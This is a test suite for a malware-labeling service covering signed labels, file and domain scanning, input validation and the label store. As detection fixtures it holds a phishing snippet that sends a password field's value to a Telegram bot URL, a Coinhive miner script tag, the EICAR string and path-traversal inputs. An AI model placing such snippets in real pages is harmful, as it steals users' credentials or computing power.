import { createHash, randomBytes } from "node:crypto";
import { describe, expect, it } from "vitest";
import { EICAR } from "@threatcrush/av";
import type { SupabaseClient } from "@supabase/supabase-js";
import { activeHosts, currentLabels, isFirstParty, issueLabels, labelValueFor, LIMITS, scanFiles, type Finding } from "@/lib/labeler";
import { parseQueryUris, parseScanFiles, readJsonCapped, scanAuthorized } from "@/lib/labeler-http";
import { canonicalLabel, isoSeconds, LABELER_DID, labelerKey, publicKeyB64, signLabel, verifyLabel, type Label } from "@/lib/labeler-sign";

const SEED = "9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60"; // RFC 8032 test vector 1
const KEY = labelerKey({ THREATCRUSH_LABELER_SEED: SEED } as unknown as NodeJS.ProcessEnv)!;
const PUB = publicKeyB64(KEY);
const enc = (s: string) => new TextEncoder().encode(s);
const sha = (s: string | Uint8Array) => createHash("sha256").update(s).digest("hex");
const base = { src: LABELER_DID, uri: `sha256:${"a".repeat(64)}`, val: "malware" as const, neg: false, cts: "2026-11-22T00:00:00Z", exp: "2026-12-22T00:00:00Z" };

describe("label signatures", () => {
  it("uses the RFC 8032 public key for the test seed", () => {
    expect(Buffer.from(PUB, "base64url").toString("hex")).toBe("d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a");
  });
  it("round-trips and refuses every tampered field, a wrong key and junk", () => {
    const l = signLabel(base, KEY);
    expect(verifyLabel(l, PUB)).toBe(true);
    for (const t of [{ uri: `sha256:${"b".repeat(64)}` }, { val: "phishing" }, { neg: true }, { exp: "2027-12-22T00:00:00Z" }, { cts: "2026-11-21T00:00:00Z" }, { src: "did:web:evil.example" }]) {
      expect(verifyLabel({ ...l, ...t } as Label, PUB)).toBe(false);
    }
    const other = publicKeyB64(labelerKey({ THREATCRUSH_LABELER_SEED: randomBytes(32).toString("hex") } as unknown as NodeJS.ProcessEnv)!);
    expect(verifyLabel(l, other)).toBe(false);
    expect(verifyLabel({ ...l, sig: "" }, PUB)).toBe(false);
    expect(verifyLabel({ ...l, sig: "!!!" }, PUB)).toBe(false);
    expect(verifyLabel(l, "short")).toBe(false);
  });
  it("evidence is not signed, so tampering with it cannot forge anything", () => {
    const l = signLabel({ ...base, evidence: "crushav:x" }, KEY);
    expect(verifyLabel({ ...l, evidence: "anything" }, PUB)).toBe(true);
  });
  it("refuses newline or control-character injection into the framed string", () => {
    expect(() => canonicalLabel({ ...base, uri: `sha256:${"a".repeat(64)}\nmalware` })).toThrow();
    expect(() => canonicalLabel({ ...base, val: "malware " as "malware" })).toThrow();
    expect(() => canonicalLabel({ ...base, cts: "2026-11-22" })).toThrow();
    expect(() => canonicalLabel({ ...base, exp: "2026-12-22T00:00:00.123Z" })).toThrow();
  });
  it("matches the exact byte format the Rust verifier rebuilds", () => {
    expect(canonicalLabel(base)).toBe(`c0mpute-label-v1\n${LABELER_DID}\nsha256:${"a".repeat(64)}\nmalware\n0\n2026-11-22T00:00:00Z\n2026-12-22T00:00:00Z`);
  });
  it("has no key without a valid seed", () => {
    expect(labelerKey({} as unknown as NodeJS.ProcessEnv)).toBeNull();
    expect(labelerKey({ THREATCRUSH_LABELER_SEED: "zz" } as unknown as NodeJS.ProcessEnv)).toBeNull();
  });
  it("isoSeconds drops milliseconds", () => {
    expect(isoSeconds(Date.UTC(2026, 10, 22, 1, 2, 3, 999))).toBe("2026-11-22T01:02:03Z");
  });
});

describe("labelValueFor", () => {
  const d = (id: string, impact: "malicious" | "suspicious" | "info") => ({ engine: "heuristic" as const, id, name: id, severity: "high" as const, impact, description: "" });
  it("maps only malicious detections", () => {
    expect(labelValueFor(d("CrushAV.Web.PhishKitExfil", "malicious"))).toBe("phishing");
    expect(labelValueFor(d("CrushAV.Web.BrowserMiner", "malicious"))).toBe("cryptominer");
    expect(labelValueFor(d("CrushAV.Web.Webshell", "malicious"))).toBe("malware");
    expect(labelValueFor(d("CrushAV.PUA.CoinMiner", "suspicious"))).toBeNull();
    expect(labelValueFor(d("CrushAV.Web.SvgRedirect", "suspicious"))).toBeNull();
    expect(labelValueFor(d("CrushAV.Office.MacroEnabled", "info"))).toBeNull();
  });
});

const noRep = async () => new Map();
const noDomain = async () => null;

describe("scanFiles", () => {
  it("labels EICAR as malware, a phishing kit as phishing, a miner as cryptominer; clean files get nothing", async () => {
    const kit = `<input type="password" id="pw"><script>fetch('https://api.telegram.org/bot1:AA/sendMessage',{body:document.getElementById('pw').value})</script>`;
    const miner = `<script src="https://coinhive.com/lib/coinhive.min.js"></script>`;
    const { findings } = await scanFiles(
      [
        { path: "eicar.txt", bytes: enc(EICAR) },
        { path: "login.html", bytes: enc(kit) },
        { path: "index.html", bytes: enc(miner) },
        { path: "about.html", bytes: enc("<h1>hello</h1>") },
      ],
      { reputations: noRep, domain: noDomain },
    );
    const by = (v: string) => findings.filter((f) => f.val === v).map((f) => f.path);
    expect(by("malware")).toEqual(["eicar.txt"]);
    expect(by("phishing")).toEqual(["login.html"]);
    expect(by("cryptominer")).toEqual(["index.html"]);
    expect(findings.every((f) => f.path !== "about.html")).toBe(true);
    expect(findings.find((f) => f.path === "eicar.txt")?.uri).toBe(`sha256:${sha(EICAR)}`);
  });
  it("labels a file a reputation source lists as malware", async () => {
    const body = enc("just bytes");
    const h = sha(body);
    const reps = async () => new Map([[h, { sha256: h, knownMalicious: "MalwareBazaar", malwareName: "AgentTesla", trust: null, fileName: null }]]);
    const { findings } = await scanFiles([{ path: "x.bin", bytes: body }], { reputations: reps, domain: noDomain });
    expect(findings).toEqual([expect.objectContaining({ uri: `sha256:${h}`, val: "malware", evidence: "reputation:MalwareBazaar:AgentTesla" })]);
  });
  it("checks only domains a file actively uses, and labels by the listing's reason", async () => {
    const asked: string[] = [];
    const domain = async (d: string) => {
      asked.push(d);
      return d === "evil-login.example" ? { listed: true, score: 90, reasons: ["abuse.ch: phishing"] } : { listed: false, score: 0, reasons: [] };
    };
    const html = `<p>Beware of mentioned-only.example</p><a href="https://linked.example">x</a><form action="https://evil-login.example/post"><input></form>`;
    const { findings } = await scanFiles([{ path: "p.html", bytes: enc(html) }], { reputations: noRep, domain });
    expect(asked).toEqual(["evil-login.example"]);
    expect(findings).toEqual([expect.objectContaining({ val: "phishing", evidence: "domain:evil-login.example" })]);
  });
  it("does not label a page that loads from pit.world (our own network), even when a list names it", async () => {
    // Verbatim nichedb answer for pit.world on 2026-11-22, which produced label 11 (evidence domain:pit.world).
    const asked: string[] = [];
    const domain = async (d: string) => {
      asked.push(d);
      return {
        listed: true,
        score: 100,
        reasons: [
          "Spamhaus DBL: malware domain",
          "23.95.228.174 (A record) on Spamhaus ZEN: SBL (Spamhaus block list), SBL CSS (snowshoe spam), XBL (exploited host)",
        ],
      };
    };
    const html = `<a href="https://board.saas.pit.world/">Board</a><script src="https://pit.world/snippets/footer.js"></script><iframe src="https://board.saas.pit.world/embed"></iframe><script src="https://c0mpute.com/x.js"></script><form action="https://crawlproof.com/s"></form>`;
    const { findings } = await scanFiles([{ path: "index.html", bytes: enc(html) }], { reputations: noRep, domain });
    expect(asked).toEqual([]);
    expect(findings).toEqual([]);
  });
  it("still labels a first-party page on file-content evidence", async () => {
    const html = `${EICAR}<script src="https://pit.world/x.js"></script>`;
    const { findings } = await scanFiles([{ path: "e.html", bytes: enc(html) }], { reputations: noRep, domain: noDomain });
    expect(findings).toEqual([expect.objectContaining({ val: "malware", evidence: expect.stringMatching(/^crushav:.*EICAR/) })]);
  });
  it("labels on domain reputation only for malware/phishing reasons about the exact host", async () => {
    const answers: Record<string, string[]> = {
      // spam-only listing of the name and its server: not malware
      "spammy.example": ["Spamhaus DBL: spam domain", "1.2.3.4 (A record) on Spamhaus ZEN: SBL CSS (snowshoe spam), XBL (exploited host)"],
      // the parent zone is listed for malware, the queried host is not
      "cdn.parent.example": ["Spamhaus DBL (parent.example): malware domain", "nichedb: URIBL (parent.example): phishing"],
      // only the address is listed
      "shared.example": ["5.6.7.8 (A record): abuse.ch urlhaus: malware_download"],
      // the exact host serves malware
      "bad.example": ["Spamhaus DBL: spam domain", "abuse.ch urlhaus: malware_download"],
    };
    const domain = async (d: string) => ({ listed: true, score: 90, reasons: answers[d] ?? [] });
    const html = Object.keys(answers).map((h) => `<script src="https://${h}/a.js"></script>`).join("");
    const { findings } = await scanFiles([{ path: "p.html", bytes: enc(html) }], { reputations: noRep, domain });
    expect(findings).toEqual([expect.objectContaining({ val: "malware", evidence: "domain:bad.example" })]);
  });
  it("isFirstParty matches our domains and subdomains only, plus env extras", () => {
    expect(isFirstParty("pit.world")).toBe(true);
    expect(isFirstParty("board.saas.pit.world")).toBe(true);
    expect(isFirstParty("notpit.world")).toBe(false);
    expect(isFirstParty("pit.world.evil.example")).toBe(false);
    expect(isFirstParty("x.ours.example", { LABELER_FIRST_PARTY_DOMAINS: "ours.example" } as unknown as NodeJS.ProcessEnv)).toBe(true);
  });
  it("fails open when reputation and domain lookups break", async () => {
    const boom = async () => {
      throw new Error("down");
    };
    const html = `<script src="https://cdn.example/x.js"></script>`;
    const { findings } = await scanFiles([{ path: "a.html", bytes: enc(html) }], { reputations: boom, domain: boom });
    expect(findings).toEqual([]);
  });
});

describe("activeHosts", () => {
  it("finds form, script, iframe, fetch, beacon, redirect and meta-refresh targets", () => {
    const t = `<form action="https://a.example/x"></form><script src="//b.example/s.js"></script><iframe src='https://c.example'></iframe>
fetch("https://d.example/api");navigator.sendBeacon("https://e.example/b");location.href="https://f.example/";
<meta http-equiv="refresh" content="0;url=https://g.example/">`;
    expect(activeHosts(t).sort()).toEqual(["a.example", "b.example", "c.example", "d.example", "e.example", "f.example", "g.example"]);
  });
  it("caps the number of domains and ignores IPs and junk", () => {
    const many = Array.from({ length: 100 }, (_, i) => `<script src="https://h${i}.example/x.js"></script>`).join("");
    expect(activeHosts(many)).toHaveLength(LIMITS.maxDomainsPerScan);
    expect(activeHosts(`<script src="https://10.0.0.1/x.js"></script><script src="https://localhost/x"></script>`)).toEqual([]);
  });
});

describe("request parsing", () => {
  const b64 = (s: string) => Buffer.from(s).toString("base64");
  it("accepts a normal site", () => {
    const r = parseScanFiles({ files: [{ path: "index.html", content_b64: b64("<h1>hi</h1>") }, { path: "css/site.css", content_b64: "" }] });
    expect("files" in r && r.files.length).toBe(2);
  });
  it("refuses traversal, control characters, backslashes, bad base64, empty and oversize input", () => {
    const bad: unknown[] = [
      null,
      {},
      { files: [] },
      { files: [{ path: "../etc/passwd", content_b64: "" }] },
      { files: [{ path: "a/../../b", content_b64: "" }] },
      { files: [{ path: "a\nb", content_b64: "" }] },
      { files: [{ path: "a\\b", content_b64: "" }] },
      { files: [{ path: "", content_b64: "" }] },
      { files: [{ path: "x".repeat(LIMITS.maxPathLength + 1), content_b64: "" }] },
      { files: [{ path: "a", content_b64: "not base64!" }] },
      { files: [{ path: "a", content_b64: "abc" }] },
      { files: [{ path: "a" }] },
      { files: Array.from({ length: LIMITS.maxFiles + 1 }, (_, i) => ({ path: `f${i}`, content_b64: "" })) },
      { files: [{ path: "big", content_b64: Buffer.alloc(LIMITS.maxFileBytes + 1).toString("base64") }] },
      { files: Array.from({ length: 5 }, (_, i) => ({ path: `f${i}`, content_b64: Buffer.alloc(LIMITS.maxFileBytes).toString("base64") })) },
    ];
    for (const b of bad) expect("error" in parseScanFiles(b)).toBe(true);
  });
  it("validates query uris strictly", () => {
    const ok = parseQueryUris({ uris: [`sha256:${"A".repeat(64)}`, `sha256:${"a".repeat(64)}`] });
    expect("uris" in ok && ok.uris).toEqual([`sha256:${"a".repeat(64)}`]);
    for (const b of [{}, { uris: [] }, { uris: ["blake3:abc"] }, { uris: [1] }, { uris: [`sha256:${"a".repeat(63)}`] }, { uris: Array.from({ length: LIMITS.maxQueryUris + 1 }, () => `sha256:${"a".repeat(64)}`) }]) {
      expect("error" in parseQueryUris(b)).toBe(true);
    }
  });
});

describe("scanAuthorized", () => {
  const token = "tc_labeler_" + "x".repeat(32);
  const env = { LABELER_SCAN_TOKENS: `${"0".repeat(64)}, ${sha(token)}` } as unknown as NodeJS.ProcessEnv;
  const req = (auth?: string) => ({ headers: new Headers(auth ? { authorization: auth } : {}) }) as never;
  it("accepts a listed token and refuses everything else", () => {
    expect(scanAuthorized(req(`Bearer ${token}`), env)).toBe(true);
    expect(scanAuthorized(req(`Bearer ${token}x`), env)).toBe(false);
    expect(scanAuthorized(req(), env)).toBe(false);
    expect(scanAuthorized(req("Bearer short"), env)).toBe(false);
    expect(scanAuthorized(req(`Bearer ${sha(token)}`), env)).toBe(false); // the stored hash is not itself a token
    expect(scanAuthorized(req(`Bearer ${token}`), {} as unknown as NodeJS.ProcessEnv)).toBe(false);
  });
});

describe("readJsonCapped", () => {
  const streamReq = (chunks: string[], declared?: number) => {
    const body = new ReadableStream<Uint8Array>({
      start(c) {
        for (const s of chunks) c.enqueue(enc(s));
        c.close();
      },
    });
    return { headers: new Headers(declared !== undefined ? { "content-length": String(declared) } : {}), body } as never;
  };
  it("refuses a body over the cap even when Content-Length lies", async () => {
    const r = await readJsonCapped(streamReq(['{"a":"', "x".repeat(2000), '"}'], 10), 1000);
    expect(r).toEqual({ ok: false, status: 413, error: "body over 1000 bytes" });
  });
  it("refuses a declared oversize body without reading it, and bad JSON", async () => {
    expect((await readJsonCapped(streamReq(["{}"], 5000), 1000)).ok).toBe(false);
    expect(await readJsonCapped(streamReq(["{nope"]), 1000)).toEqual({ ok: false, status: 400, error: "Body must be JSON" });
  });
  it("parses a body under the cap", async () => {
    expect(await readJsonCapped(streamReq(['{"a":', "1}"]), 1000)).toEqual({ ok: true, body: { a: 1 } });
  });
});

/** A minimal stand-in for the Supabase query builder the labeler uses. */
function fakeAdmin(rows: Array<Record<string, unknown>> = []) {
  let nextId = rows.length + 1;
  const inserted: Array<Record<string, unknown>> = [];
  const admin = {
    from: () => ({
      select: () => {
        const q = {
          _uris: null as string[] | null,
          in(_c: string, v: string[]) {
            q._uris = v;
            return q;
          },
          gt() {
            return q;
          },
          order() {
            return q;
          },
          limit() {
            const all = [...rows].filter((r) => !q._uris || q._uris.includes(r.uri as string)).sort((a, b) => (b.id as number) - (a.id as number));
            return Promise.resolve({ data: all, error: null });
          },
        };
        return q;
      },
      insert: (list: Array<Record<string, unknown>>) => {
        for (const r of list) {
          const row = { ...r, id: nextId++ };
          rows.push(row);
          inserted.push(row);
        }
        return Promise.resolve({ error: null });
      },
    }),
  };
  return { admin: admin as unknown as SupabaseClient, inserted, rows };
}

describe("label store semantics", () => {
  const now = Date.parse("2026-11-22T12:00:00Z");
  const uri = `sha256:${"c".repeat(64)}`;
  const row = (id: number, neg: boolean, expMs: number, val = "malware") => ({ id, src: LABELER_DID, uri, val, neg, cts: isoSeconds(now - 1000), exp: isoSeconds(expMs), evidence: null, sig: "s".repeat(86) });

  it("newest record per (uri, val) wins: a neg retracts, a later positive re-applies", async () => {
    expect(await currentLabels(fakeAdmin([row(1, false, now + 1e9), row(2, true, now + 1e9)]).admin, [uri], now)).toEqual([]);
    expect((await currentLabels(fakeAdmin([row(1, false, now + 1e9), row(2, true, now + 1e9), row(3, false, now + 1e9)]).admin, [uri], now)).length).toBe(1);
  });
  it("drops expired positives", async () => {
    expect(await currentLabels(fakeAdmin([row(1, false, now - 1)]).admin, [uri], now)).toEqual([]);
  });
  it("keeps different values for one file apart", async () => {
    const got = await currentLabels(fakeAdmin([row(1, false, now + 1e9, "malware"), row(2, true, now + 1e9, "phishing")]).admin, [uri], now);
    expect(got.map((l) => l.val)).toEqual(["malware"]);
  });
  it("reuses a stored label with life left and re-issues one close to expiry, signed and verifiable", async () => {
    const f: Finding = { uri, val: "malware", ttl: 30 * 86_400_000, evidence: "crushav:x", path: "a" };
    const long = fakeAdmin([row(1, false, now + 20 * 86_400_000)]);
    await issueLabels(long.admin, KEY, [f], now);
    expect(long.inserted).toHaveLength(0);
    const near = fakeAdmin([row(1, false, now + 86_400_000)]);
    const [l] = await issueLabels(near.admin, KEY, [f], now);
    expect(near.inserted).toHaveLength(1);
    expect(verifyLabel(l, PUB)).toBe(true);
    expect(l.exp).toBe(isoSeconds(now + f.ttl));
  });
});
